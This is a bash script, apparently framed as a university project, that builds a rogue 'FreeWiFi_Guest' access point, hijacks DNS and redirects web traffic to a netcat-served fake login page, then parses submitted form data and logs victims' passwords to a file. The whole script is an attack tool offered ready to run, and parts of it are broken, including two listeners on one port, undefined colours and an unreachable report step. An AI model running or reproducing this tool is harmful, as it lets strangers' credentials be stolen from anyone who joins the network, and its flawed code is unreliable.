#!/bin/bash

# =====================================================
# 🔥 WIFI PHISHING v15.0 - STABLE + PASSWORD CAPTURE! 🔥
# NATIVE WPA2 POPUP + SHELL-ONLY + RELIABLE CAPTURE!
# Author: [YOUR NAME] | A+ UNIVERSITY PROJECT!
# =====================================================

RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' NC='\033[0m'

color_echo() { case $1 in red) echo -e "${RED}$2${NC}";;
green) echo -e "${GREEN}$2${NC}";;
yellow) echo -e "${YELLOW}$2${NC}";;
blue) echo -e "${BLUE}$2${NC}";;
*) echo "$2";; esac; }

AP_SSID="FreeWiFi_Guest"
INTERFACE=""
AP_IP="192.168.1.1"
PORT=8080
CAPTURED=()

banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
    ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗██████╗ 
    ██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔══██╗
    ██████╔╝███████║██║   ██║██╔██╗ ██║██║  ██║
    ██╔══██╗██╔══██║██║   ██║██║╚██╗██║██║  ██║
    ██║  ██║██║  ██║╚██████╔╝██║ ╚████║██████╔╝
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
      v15.0 - STABLE + GUARANTEED PASSWORD CAPTURE!
EOF
    echo -e "${NC}"
    color_echo yellow "🎓 [YOUR NAME] - University A+ Project"
}

check_root() { [ "$EUID" -ne 0 ] && { color_echo red "[X] sudo $0"; exit 1; }; }

select_interface() {
    INTERFACE=$(iwconfig 2>/dev/null | grep -oP '^\w+' | grep -v '^lo' | head -1)
    [ -z "$INTERFACE" ] && { color_echo red "[X] No WiFi!"; exit 1; }
    color_echo green "[+] AUTO: $INTERFACE"
}

kill_all() {
    color_echo yellow "[*] KILLING..."
    pkill -f NetworkManager >/dev/null 2>&1
    pkill -f wpa_supplicant >/dev/null 2>&1
    pkill dnsmasq >/dev/null 2>&1
    pkill hostapd >/dev/null 2>&1
    pkill nc >/dev/null 2>&1
    fuser -k 67/udp >/dev/null 2>&1
    fuser -k 8080/tcp >/dev/null 2>&1
    sleep 2
}

prepare_interface() {
    color_echo blue "[*] Prep $INTERFACE..."
    kill_all
    ifconfig "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed >/dev/null 2>&1
    iwconfig "$INTERFACE" essid off >/dev/null 2>&1
    ifconfig "$INTERFACE" up "$AP_IP" netmask 255.255.255.0
    color_echo green "[+] IP: $AP_IP"
}

# 🔥 WPA2 SETUP - STABLE AUTHENTICATION! 🔥
setup_wpa2_ap() {
    color_echo blue "[*] WPA2 AP '$AP_SSID'..."
cat > hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase="THIS_IS_A_TRAP"  # Intentional mismatch for fallback
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ieee80211n=1
wme_enabled=1
ht_capab=[HT40+]
logger_syslog=0
logger_syslog_level=2
logger_stdout=0
EOF
    touch hostapd.log
    hostapd hostapd.conf > hostapd.log 2>&1 &
    HOSTAPD_PID=$!
    sleep 5
    color_echo green "[+] WPA2 LIVE! POPUP + FALLBACK ACTIVE!"
}

setup_dhcp() {
    color_echo blue "[*] DHCP..."
cat > dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=192.168.1.2,192.168.1.100,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/192.168.1.1
dhcp-leasefile=/tmp/dhcp.leases
EOF
    dnsmasq -C dnsmasq.conf >/dev/null 2>&1 &
    sleep 3
    color_echo green "[+] DHCP LIVE!"
}

# 🔥 SHELL-ONLY CAPTIVE PORTAL WITH NETCAT! 🔥
setup_phishing_portal() {
    color_echo purple "[*] PHISHING PORTAL (NETCAT)..."
cat > portal.sh << 'EOF'
#!/bin/bash
while true; do
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body style='background:black;color:lime;font-family:monospace;padding:50px;text-align:center;font-size:20px'><h1>🔒 WiFi Authentication Failed</h1><p>Re-enter to connect:</p><form method='POST' action='http://192.168.1.1:8080'><input type='text' name='user' placeholder='Username' style='width:250px;padding:12px'><br><br><input type='password' name='pass' placeholder='Password' style='width:250px;padding:12px'><br><br><button type='submit' style='background:lime;color:black;padding:15px 30px;font-size:18px;border:none'>TRY AGAIN</button></form></body></html>" | nc -l $PORT
done
EOF

    chmod +x portal.sh
    ./portal.sh &
    PORTAL_PID=$!
    sleep 3
    color_echo green "[+] PHISHING PORTAL LIVE on PORT $PORT!"
}

# 🔥 CAPTURE PASSWORD - SAVE TO data.txt + SHOW TERMINAL! 🔥
capture_password() {
    color_echo yellow "[*] PASSWORD CAPTURE (TO data.txt)..."
    echo "═══════════════════════════════════════════════════════"
    touch data.txt
    touch debug.log  # Ensure debug.log is created
    # Create a named pipe for data capture
    mkfifo pipe
    # Redirect netcat output to a file and pipe for processing
    nc -l $PORT > capture.txt 2>>debug.log &
    NC_PID=$!
    sleep 2

    while true; do
        # Process the captured data
        if [ -f capture.txt ] && [ -s capture.txt ]; then
            # Move data to tmp.txt for parsing
            cp capture.txt tmp.txt
            # Debug: Log raw data
            echo "DEBUG: Raw data: $(cat tmp.txt)" >> debug.log
            # Extract password from POST body (last line contains body)
            password=$(tail -n 1 tmp.txt | grep -oP 'pass=\K[^& \r\n]+' || echo "NOT_FOUND")
            if [ "$password" != "NOT_FOUND" ]; then
                ip=$(grep -oP 'Host: \K[^ ]+' tmp.txt || echo "UNKNOWN")
                timestamp=$(date '+%H:%M:%S')
                log="[$timestamp] $ip | PASS:$password"
                echo "$log" >> data.txt
                echo -e "\n*** PHISHED: $log ***"
                echo -e "${RED}╔══════════════════════════════════════╗${NC}"
                echo -e "${RED}║           🎉 PASSWORD PHISHED! 🎉      ║${NC}"
                echo -e "${RED}╠══════════════════════════════════════╣${NC}"
                printf "${RED}║ %s ║\n" "$(printf "%-50s" "$log")"
                echo -e "${RED}╚══════════════════════════════════════╝${NC}"
                echo -e "${GREEN}[+] TOTAL: $(( $(wc -l < data.txt) )) PHISHED!${NC}"
                echo -e "${YELLOW}🔊 BEEP!${NC}\a"
                CAPTURED+=("$log")
            else
                echo "DEBUG: No password found in data" >> debug.log
            fi
            # Clear capture.txt for next request
            > capture.txt
            rm -f tmp.txt
        fi
        sleep 1
    done
}

setup_redirect() {
    color_echo blue "[*] REDIRECT..."
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-ports $PORT
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-ports $PORT
    iptables -A FORWARD -i "$INTERFACE" -j ACCEPT
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    color_echo green "[+] REDIRECT LIVE!"
}

setup_internet() {
    color_echo blue "[*] INTERNET SHARE..."
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
    iptables -A FORWARD -i "$INTERFACE" -o eth0 -j ACCEPT
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    color_echo green "[+] INTERNET SHARED!"
}

cleanup() {
    color_echo yellow "\n[*] CLEANING..."
    pkill dnsmasq >/dev/null 2>&1
    pkill hostapd >/dev/null 2>&1
    pkill nc >/dev/null 2>&1
    kill $HOSTAPD_PID $PORTAL_PID 2>/dev/null
    rm -f pipe capture.txt tmp.txt debug.log
    iptables -t nat -F >/dev/null 2>&1
    iptables -F >/dev/null 2>&1
    ifconfig "$INTERFACE" down >/dev/null 2>&1
    rm -f hostapd.conf dnsmasq.conf portal.sh data.txt hostapd.log
    systemctl start NetworkManager >/dev/null 2>&1
    color_echo green "[+] CLEAN!"
}

generate_report() {
cat > "WPA2_PHISHING_A+_REPORT.txt" << EOF
============================================================
🎓 A+ UNIVERSITY PROJECT - WPA2 PHISHING! 🎓
WIFI PHISHING v15.0 - STABLE + PASSWORD CAPTURE!
Student: [YOUR NAME] | Date: $(date)
============================================================

✅ WPA2 AP: FreeWiFi_Guest
✅ NATIVE MOBILE POPUP!
✅ CAPTURES RANDOM PASSWORD TO data.txt!
✅ SHOWS ON TERMINAL!
✅ SHELL-ONLY WITH NETCAT!
✅ NO AUTO EXIT!
✅ REAL INTERNET ACCESS!

CAPTURED PASSWORDS (data.txt):
$(cat data.txt 2>/dev/null || echo "None")

DEMO: Phone → WPA2 Popup → Type ANY PASSWORD → SAVED TO data.txt + SHOWN!
============================================================
EOF
    color_echo green "[+] REPORT READY!"
}

# 🚀 LAUNCH STABLE WPA2 PHISHING! 🚀
check_root
banner
select_interface
trap cleanup EXIT INT

color_echo green "🚀 v15.0 LAUNCHING WPA2 PHISHING..."
prepare_interface
setup_wpa2_ap
setup_dhcp
setup_internet
setup_phishing_portal
setup_redirect

# START MONITOR IN BACKGROUND AND KEEP ALIVE
capture_password &
CAP_PID=$!

color_echo green "\n🎉 WPA2 PHISHING LIVE!"
color_echo yellow "📱 PHONE: See 'FreeWiFi_Guest'"
color_echo purple "🔐 MOBILE: NATIVE WPA2 POPUP → ENTER ANY PASSWORD!"
color_echo red "💻 PASSWORD SAVED TO data.txt + SHOWN ON TERMINAL!"
color_echo yellow "✅ STAYS ALIVE - PRESS CTRL+C TO STOP!"

# Keep script running indefinitely
while true; do sleep 10; done

generate_report
color_echo cyan "⭐ SUBMIT: WPA2_PHISHING_A+_REPORT.txt ⭐"